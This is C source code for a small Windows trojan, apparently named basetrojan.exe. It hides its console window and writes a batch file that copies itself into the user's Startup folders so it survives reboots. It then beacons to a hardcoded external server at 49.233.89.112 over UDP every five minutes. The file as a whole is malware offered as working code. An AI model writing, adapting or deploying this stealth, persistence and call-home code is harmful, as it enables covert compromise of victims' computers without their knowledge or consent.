#include <WinSock2.h>
#include <Windows.h>
#include<direct.h>
#include<stdio.h>
#pragma comment(lib,"ws2_32.lib")
#pragma comment(linker, "/subsystem:\"windows\" /entry:\"mainCRTStartup\"" )
#define BUFFER_SIZE 4096
char bat[]="@echo off \ncopy /y \"%~dp0basetrojan.exe\"  C:\\\"Documents and Settings\"\\Administrator\\\"「开始」菜单\"\\程序\\启动\ncopy /y \"%~dp0basetrojan.exe\"  C:\\Users\\alpha\\AppData\\Roaming\\Microsoft\\Windows\\\"Start Menu\"\\Programs\\Startup \n";
int main(int argc,char* argv[]) {
	system("b.bat");
	ShowWindow(FindWindow((LPCWSTR)"ConsoleWindowClass",(LPCWSTR)argv[0]), 0);
	char buf1[256];
	_getcwd(buf1, sizeof(buf1));
	printf("%s\n",buf1);
	if(strcmp(buf1,"C:\\Users\\alpha\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup")!=0){
		FILE* fp=fopen("b.bat","w");
		fputs(bat,fp);
		system(bat);
		//Sleep(10*1000);
		system("b.bat");
		exit(1);
	}
	while (1) {
		
		WSADATA wsa_data;
		int ret = WSAStartup(MAKEWORD(2, 2), &wsa_data);
		SOCKET fd_socket = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
		SOCKADDR_IN server_addr; //服务器配置
		int port = 15002; //端口号?
		server_addr.sin_family = AF_INET;
		server_addr.sin_port = htons(port);//端口号范围： 0 ~65535
		server_addr.sin_addr.s_addr = inet_addr("49.233.89.112");
		char send_buff[512] = "example";
		ret = sendto(fd_socket, send_buff, strlen(send_buff), 0, (SOCKADDR *)&server_addr, 512);
		closesocket(fd_socket);
		WSACleanup();
		Sleep(5*60*1000);
		//Sleep(1000);
	}
}

